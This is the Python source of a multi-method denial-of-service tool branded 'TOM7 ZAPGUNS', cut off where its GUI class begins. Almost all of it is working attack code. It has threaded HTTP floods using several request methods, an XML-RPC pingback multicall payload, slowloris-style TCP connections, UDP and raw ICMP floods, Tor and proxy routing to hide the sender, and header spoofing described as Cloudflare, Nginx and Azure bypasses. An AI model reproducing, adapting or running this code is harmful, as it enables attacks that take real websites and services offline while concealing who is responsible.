# CREATED BY TOM7
# GGNTM26X SECURITY TEAM
# TOM7 ZAPGUNS 4 DUAL WILDS
# MULTI-METHODS & MULTI CONTROL PANELS DDOS TOOLS BY TOM7
# BY TOM7 FOR PEOPLE`s

try:
  import collections
  import colorama
  import concurrent.futures
  import ctypes
  import flask
  import http.client
  import itertools
  import logging
  import os
  import random
  import requests
  import rich
  import secrets
  import signal
  import socket
  import socks
  import ssl
  import string
  import struct
  import sys
  import threading
  import time
  import tkinter as tk
  import urllib.parse
  import urllib3

  from collections import deque
  from colorama import Back, Fore, init
  from concurrent.futures import Future, ThreadPoolExecutor
  from flask import Flask, jsonify, redirect, request, render_template as RTEMXP, send_from_directory as FSDIRX, session
  from itertools import cycle
  from ssl import CERT_NONE as SSLCNX, create_default_context as SSLCDCX, SSLContext
  from sys import stdout
  from time import sleep
  from tkinter import font as tkfont, messagebox, ttk
  from urllib.parse import urlparse

except ModuleNotFoundError as e:
  print(f"Required Modules: {e} Is Not Installed. Please Run > pip3 install -r requirements.txt {e}")

# UTILITY CONFIGURATIONS

init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(level=logging.DEBUG, format="%(asctime)s - %(levelname)s - %(message)s")

spinner = cycle(["|", "/", "-", "\\"])

lockx = threading.Lock()

consolemsgx = deque(maxlen=10000000000)

# CONSOLE PANEL STATUS CONFIGURATIONS

def consolepanelmsg(message):
  global consolemsgx
  with lockx:
    consolemsgx.append(message)

# GLOBAL UTILITY CONFIGURATIONS

def cleargui():
  os.system("cls" if os.name == "nt" else "clear")

def dinamicsgui(startgui):
    cleargui()
    tom7arrow = cycle(range(1, 10))
    barlengh = 10

    for i in range(1, 101):
        xspin = next(spinner)
        xpos = next(tom7arrow)
        xbar = '>>> ' * xpos + f'{Back.CYAN}{Fore.BLACK}TOM7{Back.RESET}{Fore.MAGENTA}' + ' <<<' * (barlengh - xpos)
        cleargui()
        stdout.write(f'\r{Back.CYAN} {Fore.BLACK} {startgui} {Back.RESET} {Fore.RED} [ {Fore.YELLOW} {xspin} {Fore.RED} ] {Back.MAGENTA} {Fore.BLACK} LOADED {Back.RESET} {Fore.RED} [ {Fore.LIGHTGREEN_EX} {i:03d}/100 {Fore.RED} ] {Back.LIGHTBLUE_EX} {Fore.WHITE} PROGRESS BAR {Back.RESET} {Fore.RED} [ {Fore.LIGHTGREEN_EX} {xbar} {Fore.RED} ]')
        stdout.flush()
        sleep(0.01)

# SIGNAL HANDLER

def signalx(sig, frame):
    """Handle Ctrl+C gracefully"""
    print(f"\n\n{Fore.YELLOW}[!] Keyboard Interrupt Detected{Fore.RESET}")
    print(f"{Fore.YELLOW}[!] Stopping attacks...{Fore.RESET}")
    
    with lockx:
        xstatus.startx = False
        xstatus.monitorx = True
    
    sleep(1)
    print(f"{Fore.GREEN}[✓] Cleanup complete{Fore.RESET}")
    sys.exit(0)

signal.signal(signal.SIGINT, signalx)

# TOM7 BANNER

XBANNER = """
                    .    ..  .............. . . ......... ......................
                    .    ..  .......... ... ..xxxxxxxxx.. ................ ... .
                        .       ...    ...xxxxxxxxxxxxxx...............  .. ..
                                      ..xxxxxxxxxxxxxxxxxxx......  ....      ..
                                      .x...xxxxxxxxxxxxxxxxx. ..     ..     .
                                    .xx...xxxxxxxxxxxxxxxxxxxx
                                    .....xxxxxxxxxxxxxxxxxxxxx.
                                    .x....xxxx.....xxxxxxxx.xxxx
                                    .....x..       ...xxxxxx...x.
                                  .......             .xxxxx...x
                                  x...    ............  ..xx.....
                                  ....         ... ...     .xx....
                                  ...      .    ...  . ...  .xx...
                                ...    ........xxxx.......   .x...
                                ..       .......xxxxxxxxxx.    .x...
                                ..       .......xxxxxxxxx..     ....
                                ..        .........xxxxx..       ...
                                ..         .......xxxxx..        ...
                                ...        .......xxxx.        ...
                                  ...        ...xxxxx..        ...
                    ..            .....       .......       .... ...
                    !xxx.     .....    ...                ..............      .x
                    !!!!xx.........     ....           .... ..........xxx....x!:
                    xxxx............       ..        ...  .... ..........xxxxxx!
                    x..................    ...     ..... .. ................xxxx
                    ...................... ...  ................................
                    .................._____ ___  __  __ ____ ...................
                    .................|_   _/ _ \|  \/  |__  |...................
                    ...................| || (_) | |\/| | / /....................
                    ...................|_| \___/|_|  |_|/_/.....................
                    ....................ARMED V2 | ZAPGUNS......................
                    ............................................................
                                 ____  _   ___  ___ _   _ _  _ ___
                                |_  / /_\ | _ \/ __| | | | \| / __|
                                 / / / _ \|  _/ (_ | |_| | .` \__ \ 
                                /___/_/ \_\_|  \___|\___/|_|\_|___/
"""

UATX = "UA.txt"
PROXTX = "Proxies.txt"
REFTX = "Referers.txt"

UATXD = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/15.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/117.0"
]

PROXTXD = [
    "http://127.0.0.1:9050",
    "https://127.0.0.1:9050",
    "socks4://127.0.0.1:9050",
    "socks5://127.0.0.1:9050"
]

REFTXD = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://duckduckgo.com/search?q=",
    "https://search.yahoo.com/search?q=",
    "https://www.baidu.com/search?q=",
    "https://yandex.com/search?q=",
    "https://www.startpage.com/search?q=",
    "https://www.ecosia.org",
    "https://www.qwant.com/search?q=",
    "https://search.brave.com/search?q=",
    "https://www.mojeek.com/search?q=",
    "https://searx.org",
    "https://www.dogpile.com/search?q=",
    "https://www.webcrawler.com/search?q=",
    "https://www.ixquick.com/search?q=",
    "https://www.gigablast.com/search?q=",
    "https://swisscows.com/search?q=",
    "https://metager.org",
    "https://www.youtube.com/search?q=",
    "https://www.google.com/search?q=",
    "https://news.google.com/search?q=",
    "https://scholar.google.com/search?q=",
    "https://www.reddit.com/search?q=",
    "https://twitter.com/search?q=",
    "https://x.com/search?q=",
    "https://github.com/search?q=",
    "https://stackoverflow.com/search?q=",
    "https://www.amazon.com/search?q=",
    "https://web.archive.org",
    "https://search.crossref.org",
    "https://ahmia.fi",
    "https://duckduckgogg42xjoc72x3sjasowoarfbgcmvfimaftt6twagswzczad.onion",
    "https://brave.com/search?q="
]

def docloader(filename, xproxies=False):
    try:
        xloaded = []
        xconfdir = os.path.dirname(os.path.abspath(__file__))    
        xconfpath = os.path.join(xconfdir, filename)
        if not os.path.exists(xconfpath):
            if filename == UATX:
                print(f"Error {filename} Not Found. Now Using Default Configuration")
                return UATXD
            elif filename == PROXTX:
                print(f"Error {filename} Not Found. Now Using Default Configuration")
                return PROXTXD
            elif filename == REFTX:
                print(f"Error {filename} Not Found. Now Using Default Configuration")
                return REFTXD
            return []
        
        with open(xconfpath, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                item = line.strip()
                if item and not item.startswith("#"):
                    if xproxies:
                        if "://" in item:
                            xloaded.append(item)
                    else:
                        xloaded.append(item)

        if not xloaded:
            if filename == UATX:
                print(f"Error {filename} Is Not Configuration Files / Malformed. Now Using Default Configuration")
                return UATXD
            elif filename == PROXTX:
                print(f"Error {filename} Is Not Configuration Files / Malformed. Now Using Default Configuration")
                return PROXTXD
            elif filename == REFTX:
                print(f"Error {filename} Is Not Configuration Files / Malformed. Now Using Default Configuration")
                return REFTXD
        return xloaded
    
    except Exception as e:
        print(f"[ERR] Failed To Load {filename}: {e}")
        if filename in [UATX, PROXTX, REFTX]:
            if filename == UATX:
                print(f"Error {filename} Error Status !")
                return UATXD
            elif filename == PROXTX:
                print(f"Error {filename} Error Status !")
                return PROXTXD
            elif filename == REFTX:
                print(f"Error {filename} Error Status !")
                return REFTXD
        return []
    
# GLOBAL VALUE CONFIGURATIONS
    
xuseragent = docloader(UATX)
xproxy = docloader(PROXTX, xproxies=True)
xreferer = docloader(REFTX)

xcontenttype = [
    "application/json",
    "application/manifest+json",
    "application/msword",
    "application/octet-stream",
    "application/ogg",
    "application/pdf",
    "application/vnd.openxmlformats-officedocument.wordprocessingml.document"
    "application/x-httpd-php",
    "application/x-www-form-urlencoded",
    "application/xml",
    "application/zip",
    "audio/ogg",
    "audio/wav",
    "audio/webm"
    "image/png",
    "image/svg+xml",
    "image/webp",
    "text/css",
    "text/html",
    "text/javascript",
    "text/plain",
    "video/webm",
]

xdata = {
    'username': ''.join(random.choices(string.ascii_letters, k=10)),
    'password': ''.join(random.choices(string.ascii_letters + string.digits, k=15)),
    'email': f"{''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 15)))}@gmail.com",
    'token': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
    'data': ''.join(random.choices(string.ascii_letters + string.digits, k=1000))
}

xmlpayloadx = """
        <?xml version="1.0"?>
        <methodCall>
            <methodName>system.multicall</methodName>
            <params>
                <param><value><array><data>{}</data></array></value></param>
            </params>
        </methodCall>
        """.format("".join(['<value><string>pingback.ping</string></value>'* 1000]))

xmlrpcpathx = ["/xmlrpc.php", "/xmlrpc", "/rpc", "/api/xmlrpc"]

endpoints = ["/api", "/json", "/data", "/upload", "/submit", "/"]
endpoint = random.choice(endpoints)

# TOR PROXIES

tornet = False

def xtor(target):
    global tornet
    parsed = urlparse(target)
    host = parsed.hostname
    port = 443 if parsed.scheme == "https" else 80
    torsocks = socks.SOCKS5
    toraddr = "127.0.0.1"
    torport = 9050

    try:
        ipaddr = socket.gethostbyname(host)
    except socket.gaierror as e:
        logging.error(f"Failed To Solved DNS Resolution For {host}\n[ ERROR ]: {e}")
        return None
    
    try:
        torsx = socks.socksocket()
        torsx.set_proxy(torsocks, toraddr, torport, rdns=True)
        torsx.settimeout(5)
        torsx.connect((ipaddr, port))
        tornet = True
        logging.info(f"[ + TOR ]: Proxies Enabled.")
        return torsx
    except Exception as e:
        logging.error(f"[ TOR ]: Network Failed: {type(e).__name__} - {e}")
        tornet = False
        return None

# ATTACK MONITOR CONFIGURATIONS

class AttackStatus:
    def __init__(self):
        self.startx = False
        self.monitorx = False
        self.targetx = None
        self.methodx = None
        self.rps = 0

xstatus = AttackStatus()

# WAF EVASION CONFIGURATIONS

def xevasion():
    xevadetechniques = [
        lambda: {"Connection": "keep-alive", "Accept-Encoding": "gzip, deflate, br", "Accept": "text/html,application/xhtml+xml"},
        lambda: {"X-Forwarded-For": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"},
        lambda: {"Referer": random.choice(xreferer) + f"; {''.join(random.choices(string.ascii_letters, k=5))}"},
        lambda: {"Accept-Language": random.choice(["en-US,en;q=0.9", "fr-FR,fr;q=0.8", "de-DE,de;q=0.7", "es-ES,es;q=0.6"])},
        lambda: {"Cache-Control": random.choice(["no-cache", "max-age=0"])},
        lambda: {"User-Agent": random.choice(xuseragent) + f"; {''.join(random.choices(string.ascii_letters, k=5))}"},
        lambda: {"Via": f"1.1 {''.join(random.choices(string.ascii_lowercase, k=10))}.proxy"},
        lambda: {"DNT": "1"},
        lambda: {"X-Requested-With": "XMLHttpRequest"},
        lambda: {"CF-Connecting-IP": f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"}, # Cloudflare Bypass
        lambda: {'X-Real-IP': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"}, # Nginx bypass
        lambda: {'Forwarded': f"for={random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)};proto=https"}, # Azure bypass
        lambda: {'X-Client-IP': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"}
    ]

    return {k: v for d in random.sample(xevadetechniques, k=random.randint(2, 5)) for k, v in d().items()}

# GLOBAL ATTACK METHODS

# LAYER 4 | TCP | UDP | ICMP | SYN For Upcoming
# LAYER 7 | HTTP | GET | POST | JSON | HEAD | PUT | DELETE | XML-RPC | 


class AttackMethods:
    
    @staticmethod
    def updatethreads(target):
        global xstatus, consolemsgx

        parsed = urlparse(target)
        host = parsed.hostname
        port = 443 if parsed.scheme == "https" else 80
        ipaddr = socket.gethostbyname(host)

        with lockx:
            xstatus.rps += 1
            xcurrent = xstatus.rps
            target = target if target else xstatus.targetx
            xmethod = xstatus.methodx

        try:
            message = f"\r{Fore.RED}[{Fore.CYAN} {next(spinner)} {Fore.RED}] {Fore.CYAN} REQUESTS: {Fore.LIGHTGREEN_EX}[{Fore.LIGHTRED_EX} {xcurrent} {Fore.LIGHTGREEN_EX}] {Fore.MAGENTA} Attack Launched To TARGET: {Fore.GREEN} {host} {Fore.MAGENTA} METHOD: {Fore.GREEN} {xmethod} {Fore.MAGENTA} IP ADDRESS: {Fore.GREEN} {ipaddr} {Fore.MAGENTA} PORT: {Fore.GREEN} {port} {Fore.RESET}"
            consolepanelmsg(message)
            stdout.write(f"\r{Fore.RED}[{Fore.CYAN} {next(spinner)} {Fore.RED}] {Fore.CYAN} REQUESTS: {Fore.LIGHTGREEN_EX}[{Fore.LIGHTRED_EX} {xcurrent} {Fore.LIGHTGREEN_EX}] {Fore.MAGENTA} Attack Launched To TARGET: {Fore.GREEN} {host} {Fore.MAGENTA} METHOD: {Fore.GREEN} {xmethod} {Fore.MAGENTA} IP ADDRESS: {Fore.GREEN} {ipaddr} {Fore.MAGENTA} PORT: {Fore.GREEN} {port} {Fore.RESET}")
            stdout.flush()
        except Exception as e:
            logging.error(f"[ ERROR ]: RPS Monitor Error: {e}")

    @staticmethod
    def xhttpflood(target, duration, threads, proxy=None, tornet=False):
        countdownx = time.time() + duration
        parsed = urlparse(target)
        host = parsed.hostname
        port = 443 if parsed.scheme == "https" else 80
        ipaddr = socket.gethostbyname(host)

        def attack():
            sessionx = requests.Session()
            if tornet:
                    sessionx.proxies = {
                        'http': 'socks5://127.0.0.1:9050',
                        'https': 'socks5://127.0.0.1:9050'
                    }

            elif proxy:
                sessionx.proxies = {
                    "http": proxy,
                    "https": proxy
                }

            try:
                while time.time() < countdownx and xstatus.startx:
                    try:
                        xheaders = {
                            "User-Agent": random.choice(xuseragent),
                        }

                        xheaders.update(xevasion())

                        sessionx.get(
                            target + f"?{''.join(random.choices(string.ascii_lowercase, k=10))}",
                            timeout=3,
                            verify=False,
                            headers=xheaders
                        )

                        AttackMethods.updatethreads(target)
                    except Exception as e:
                        logging.error(f"[ ERROR ]: Attack Failed: {e}")
                    finally:
                        sleep(0.01)

            finally:
                sessionx.close()

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(attack) for _ in range(threads)]
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logging.debug(f"Thread Error: {e}")

    @staticmethod
    def xgetflood(target, duration, threads, proxy=None, tornet=False):
        countdownx = time.time() + duration
        parsed = urlparse(target)
        host = parsed.hostname
        port = 443 if parsed.scheme == "https" else 80
        ipaddr = socket.gethostbyname(host)

        def attack():
            sessionx = requests.Session()
            if tornet:
                    sessionx.proxies = {
                        'http': 'socks5://127.0.0.1:9050',
                        'https': 'socks5://127.0.0.1:9050'
                    }

            elif proxy:
                sessionx.proxies = {
                    "http": proxy,
                    "https": proxy
                }

            try:
                while time.time() < countdownx and xstatus.startx:
                    try:
                        body = '&'.join([f"{k}={v}" for k, v in xdata.items()])

                        xheaders = {
                            "User-Agent": random.choice(xuseragent), 
                            "Content-Type": random.choice(xcontenttype),
                            "Content-Length": str(len(body))
                        }

                        xheaders.update(xevasion())

                        sessionx.get(
                            target + endpoint,
                            timeout=3,
                            verify=False,
                            headers=xheaders
                        )

                        AttackMethods.updatethreads(target)
                    except Exception as e:
                        logging.error(f"[ ERROR ]: Attack Failed: {e}")
                    finally:
                        sleep(0.01)
                        
            finally:
                sessionx.close()

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(attack) for _ in range(threads)]
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logging.debug(f"Thread Error: {e}")

    @staticmethod
    def xpostflood(target, duration, threads, proxy=None, tornet=False):
        countdownx = time.time() + duration
        parsed = urlparse(target)
        host = parsed.hostname
        port = 443 if parsed.scheme == "https" else 80
        ipaddr = socket.gethostbyname(host)

        def attack():
            sessionx = requests.Session()
            if tornet:
                    sessionx.proxies = {
                        'http': 'socks5://127.0.0.1:9050',
                        'https': 'socks5://127.0.0.1:9050'
                    }

            elif proxy:
                sessionx.proxies = {
                    "http": proxy,
                    "https": proxy
                }

            try:
                while time.time() < countdownx and xstatus.startx:
                    try:
                        body = '&'.join([f"{k}={v}" for k, v in xdata.items()])

                        xheaders = {
                            "User-Agent": random.choice(xuseragent), 
                            "Content-Type": random.choice(xcontenttype),
                            "Content-Length": str(len(body))
                        }

                        xheaders.update(xevasion())

                        sessionx.post(
                            target + endpoint,
                            data=xdata,
                            headers=xheaders,
                            timeout=5,
                            verify=False
                        )

                        AttackMethods.updatethreads(target)
                    except Exception as e:
                        logging.error(f"[ ERROR ]: Attack Failed: {e}")
                    finally:
                        sleep(0.01)

            finally:
                sessionx.close()

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(attack) for _ in range(threads)]
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logging.debug(f"Thread Error: {e}")

    @staticmethod
    def xjsonflood(target, duration, threads, proxy=None, tornet=False):
        countdownx = time.time() + duration
        parsed = urlparse(target)
        host = parsed.hostname
        port = 443 if parsed.scheme == "https" else 80
        ipaddr = socket.gethostbyname(host)
        payloadx = ''.join(random.choices(string.ascii_letters + string.digits, k=10000000))

        def attack():
            sessionx = requests.Session()
            if tornet:
                    sessionx.proxies = {
                        'http': 'socks5://127.0.0.1:9050',
                        'https': 'socks5://127.0.0.1:9050'
                    }

            elif proxy:
                sessionx.proxies = {
                    "http": proxy,
                    "https": proxy
                }

            try:
                while time.time() < countdownx and xstatus.startx:
                    try:
                        xheaders = {
                            "User-Agent": random.choice(xuseragent),
                            "Content-Type": "application/json",
                            "Content-Length": str(len(payloadx))
                        }

                        xheaders.update(xevasion())

                        sessionx.post(
                            target + f"?{''.join(random.choices(string.ascii_lowercase, k=10))}",
                            data=payloadx,
                            timeout=5,
                            verify=False,
                            headers=xheaders
                        )

                        AttackMethods.updatethreads(target)
                    except Exception as e:
                        logging.error(f"[ ERROR ]: Attack Failed: {e}")
            finally:
                sessionx.close()

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(attack) for _ in range(threads)]
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logging.debug(f"Thread Error: {e}")

    @staticmethod
    def xheadflood(target, duration, threads, proxy=None, tornet=False):
        countdownx = time.time() + duration
        parsed = urlparse(target)
        host = parsed.hostname
        port = 443 if parsed.scheme == "https" else 80
        ipaddr = socket.gethostbyname(host)

        def attack():
            sessionx = requests.Session()
            if tornet:
                    sessionx.proxies = {
                        'http': 'socks5://127.0.0.1:9050',
                        'https': 'socks5://127.0.0.1:9050'
                    }

            elif proxy:
                sessionx.proxies = {
                    "http": proxy,
                    "https": proxy
                }

            try:
                while time.time() < countdownx and xstatus.startx:
                    try:
                        xheaders = {
                            "User-Agent": random.choice(xuseragent)
                        }

                        xheaders.update(xevasion())

                        sessionx.head(
                            target,
                            headers=xheaders,
                            timeout=5,
                            verify=False
                        )

                        AttackMethods.updatethreads(target)
                    except Exception as e:
                        logging.error(f"[ ERROR ]: Attack Failed: {e}")
            finally:
                sessionx.close()

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(attack) for _ in range(threads)]
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logging.debug(f"Thread Error: {e}")

    @staticmethod
    def xputflood(target, duration, threads, proxy=None, tornet=False):
        countdownx = time.time() + duration
        parsed = urlparse(target)
        host = parsed.hostname
        port = 443 if parsed.scheme == "https" else 80
        ipaddr = socket.gethostbyname(host)

        def attack():
            sessionx = requests.Session()
            if tornet:
                    sessionx.proxies = {
                        'http': 'socks5://127.0.0.1:9050',
                        'https': 'socks5://127.0.0.1:9050'
                    }

            elif proxy:
                sessionx.proxies = {
                    "http": proxy,
                    "https": proxy
                }

            try:
                while time.time() < countdownx and xstatus.startx:
                    try:
                        xheaders = {
                            "User-Agent": random.choice(xuseragent)
                        }

                        xheaders.update(xevasion())

                        sessionx.put(
                            target + f"?{''.join(random.choices(string.ascii_letters, k=10))}",
                            headers=xheaders,
                            data=xdata,
                            timeout=5,
                            verify=False
                        )

                        AttackMethods.updatethreads(target)
                    except Exception as e:
                        logging.error(f"[ ERROR ]: Attack Failed: {e}")
            finally:
                sessionx.close()

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(attack) for _ in range(threads)]
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logging.debug(f"Thread Error: {e}")

    @staticmethod
    def xdeleteflood(target, duration, threads, proxy=None, tornet=False):
        countdownx = time.time() + duration
        parsed = urlparse(target)
        host = parsed.hostname
        port = 443 if parsed.scheme == "https" else 80
        ipaddr = socket.gethostbyname(host)

        def attack():
            sessionx = requests.Session()
            if tornet:
                    sessionx.proxies = {
                        'http': 'socks5://127.0.0.1:9050',
                        'https': 'socks5://127.0.0.1:9050'
                    }

            elif proxy:
                sessionx.proxies = {
                    "http": proxy,
                    "https": proxy
                }

            try:
                while time.time() < countdownx and xstatus.startx:
                    try:
                        xheaders = {
                            "User-Agent": random.choice(xuseragent)
                        }

                        xheaders.update(xevasion())

                        sessionx.delete(
                            target + f"?{''.join(random.choices(string.ascii_letters, k=10))}",
                            headers=xheaders,
                            timeout=5,
                            verify=False
                        )
                        AttackMethods.updatethreads(target)
                    except Exception as e:
                        logging.error(f"[ ERROR ]: Attack Failed: {e}")
            finally:
                sessionx.close()

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(attack) for _ in range(threads)]
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logging.debug(f"Thread Error: {e}")

    @staticmethod
    def xxmlrpcflood(target, duration, threads, proxy=None, tornet=False):
        countdownx = time.time() + duration
        parsed = urlparse(target)
        host = parsed.hostname
        port = 443 if parsed.scheme == "https" else 80
        ipaddr = socket.gethostbyname(host)

        def attack():
            sessionx = requests.Session()
            if tornet:
                    sessionx.proxies = {
                        'http': 'socks5://127.0.0.1:9050',
                        'https': 'socks5://127.0.0.1:9050'
                    }

            elif proxy:
                sessionx.proxies = {
                    "http": proxy,
                    "https": proxy
                }

            try:
                while time.time() < countdownx and xstatus.startx:
                    try:
                        xheaders = {
                            "User-Agent": random.choice(xuseragent), 
                            "Content-Type": "text/xml",
                            "Content-Length": str(len(xmlpayloadx))
                        }

                        xheaders.update(xevasion())

                        for path in xmlrpcpathx:
                            sessionx.post(
                                target.rstrip('/') + path, 
                                data=xmlpayloadx, 
                                timeout=5, 
                                verify=False,
                                headers=xheaders
                            )

                        AttackMethods.updatethreads(target)
                    except Exception as e:
                        logging.error(f"[ ERROR ]: Attack Failed: {e}")
                    finally:
                        sleep(0.01)

            finally:
                sessionx.close()

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(attack) for _ in range(threads)]
            for future in concurrent.futures.as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logging.debug(f"Thread Error: {e}")

    @staticmethod
    def xtcpflood(target, duration, threads):
        countdownx = time.time() + duration
        xsocketlist = []
        parsed = urlparse(target)
        host = parsed.hostname
        port = 443 if parsed.scheme == "https" else 80
        try:
            ipaddr = socket.gethostbyname(host) if host else socket.gethostname()
        except Exception as e:
            ipaddr = socket.gethostname()

        def createtcpsocksx():
            try:
                tom7byte = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    f"User-Agent: {random.choice(xuseragent)}\r\n"
                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                    f"Accept-Language: en-US,en;q=0.5\r\n"
                    f"Accept-Encoding: gzip, deflate\r\n"
                    f"Connection: keep-alive\r\n"
                    f"Upgrade-Insecure-Requests: 1\r\n\r\n"
                )
                
                dosx = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                dosx.settimeout(5)
                dosx.connect((ipaddr, port))

                if port == 443:
                    sslcontextx = SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                    sslcontextx.check_hostname = False
                    sslcontextx.verify_mode = SSLCNX
                    dosx = sslcontextx.wrap_socket(dosx, server_hostname=host)

                dosx.sendall(tom7byte.encode())
                dosx.sendall(xevasion().items().__str__().encode())
                
                AttackMethods.updatethreads(target)
                return dosx

            except socket.timeout:
                logging.debug(f"TCP Socket Timeout")
                return None
            except ssl.SSLError as e:
                logging.debug(f"TCP SSL Error: {e}")
                return None
            except Exception as e:
                logging.debug(f"TCP Socket Creation Error: {e}")
                return None
            
        for _ in range(threads):
            createsockstcp = createtcpsocksx()
            if createsockstcp:
                xsocketlist.append(createsockstcp)

        while time.time() < countdownx and xstatus.startx:
            for dosx in xsocketlist[:]:
                try:
                    alive = f"X-a: {random.randint(1, 10000)}\r\n".encode()
                    dosx.send(alive)
                    dosx.sendall(alive)
                    sleep(0.01)
                    AttackMethods.updatethreads(target)
                except (socket.error, ssl.SSLError, OSError) as e:
                    if dosx in xsocketlist:
                        xsocketlist.remove(dosx)
                    try:
                        dosx.close()
                    except:
                        pass

                    newsocketx = createtcpsocksx()
                    if newsocketx:
                        xsocketlist.append(newsocketx)

        for dosx in xsocketlist:
            try:
                dosx.shutdown(socket.SHUT_RDWR)
                dosx.close()
            except:
                pass

    @staticmethod
    def xudpflood(target, duration, threads):
        countdownx = time.time() + duration
        xsocketlist = []
        parsed = urlparse(target)
        host = parsed.hostname
        udpport = [53, 80, 123, 161, 443, 500, 1194, 3074, 3478, 4500] + list(range(10000, 65535, 1000))
        portx = random.choice(udpport)

        try:
            ipaddr = socket.gethostbyname(host) if host else socket.gethostname()
        except socket.gaierror:
            logging.error(f"[ ERROR ]: UDP Flood: Cannot Resolve {host}")
            ipaddr = socket.gethostname()
            return

        def createudpsockx():
            try:
                dosx = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                dosx.settimeout(5)
                datasizex = random.randint(512, 2048)
                datax = ''.join(random.choices(string.ascii_letters + string.digits, k=datasizex)).encode('utf-8')
                portx = random.choice(udpport)
                targetxc = (ipaddr, portx)
                dosx.sendto(datax, targetxc)
                AttackMethods.updatethreads(target)
                return dosx, datax
            except Exception as e:
                logging.debug(f"UDP Socket Error: {e}")
                return None, None

        for _ in range(threads):
            udpsockx = createudpsockx()
            if udpsockx[0]:
                xsocketlist.append(udpsockx)

        while time.time() < countdownx and xstatus.startx:
            for dosx, datax in xsocketlist[:]:
                try:
                    portx = random.choice(udpport)
                    dosx.sendto(datax, (ipaddr, portx))
                    AttackMethods.updatethreads(target)
                except Exception as e:
                    if (dosx, datax) in xsocketlist:
                        xsocketlist.remove((dosx, datax))

                    udpsockx = createudpsockx()

                    if udpsockx[0]:
                        xsocketlist.append(udpsockx)
                finally:
                    sleep(0.01)

        for dosx, _ in xsocketlist:
            try:
                dosx.close()
            except Exception as e:
                logging.debug(f"Failed To Close UDP Socket: {e}")

    @staticmethod
    def xicmpflood(target, duration, threads):
        if os.name == "nt":
            if not ctypes.windll.shell32.IsUserAnAdmin():
                logging.error("ICMP Flood requires Administrator privileges on Windows!")
                consolepanelmsg("ICMP Flood requires Administrator privileges!")
                return
        else:
            try:
                if os.getuid() != 0:
                    logging.error("ICMP Flood requires root privileges on Linux!")
                    consolepanelmsg("ICMP Flood requires root privileges!")
                    return
            except AttributeError:
                pass

        countdownx = time.time() + duration
        xsocketlist = []
        parsed = urlparse(target)
        host = parsed.hostname

        try:
            ipaddr = socket.gethostbyname(host)
        except Exception:
            ipaddr = socket.gethostname()

        def checksum(data):
            s = 0
            for i in range(0, len(data), 2):
                a = data[i]
                b = data[i+1] if i+1 < len(data) else 0
                s += (a << 8) + b
            s = (s >> 16) + (s & 0xffff)
            s += s >> 16
            return ~s & 0xffff
        
        def createicmpdatax(ident):
            headerx = struct.pack("bbHHh", 8, 0, 0, ident, 1)
            casex = ''.join(random.choices(string.ascii_letters, k=1024))
            datax = casex.encode()
            chksum = checksum(headerx + datax)
            headerx = struct.pack("bbHHh", 8, 0, socket.htons(chksum), ident, 1)
            return headerx + datax
        
        def createicmpsockx():
            try:
                packetidx = os.getpid() & 0xFFFF
                packet = createicmpdatax(packetidx)
                dosx = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                dosx.settimeout(5)
                dosx.sendto(packet, (ipaddr, 0))
                AttackMethods.updatethreads(target)
                return dosx
            except PermissionError:
                logging.error(f"ICMP Flood Requires Elevated Privileges!")
                return None
            except Exception as e:
                logging.debug(f"ICMP Flood Error: {e}")
                return None
            
        for _ in range(threads):
            sockclosex = createicmpsockx()
            if sockclosex:
                xsocketlist.append(sockclosex)

        while time.time() < countdownx and xstatus.startx:
            for dosx in xsocketlist[:]:
                try:
                    packet = createicmpdatax(os.getpid() & 0xFFFF)
                    dosx.sendto(packet, (ipaddr, 0))
                    AttackMethods.updatethreads(target)
                except Exception:
                    if dosx in xsocketlist:
                        xsocketlist.remove(dosx)
                finally:
                    sleep(0.01)

        for dosx in xsocketlist:
            try:
                dosx.close()
            except:
                pass

# GLOBAL GUI CONFIGURATIONS

class TOM7ARMEDGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("TOM7 ARMED V3 | ZAPGUNS DUAL WILD")
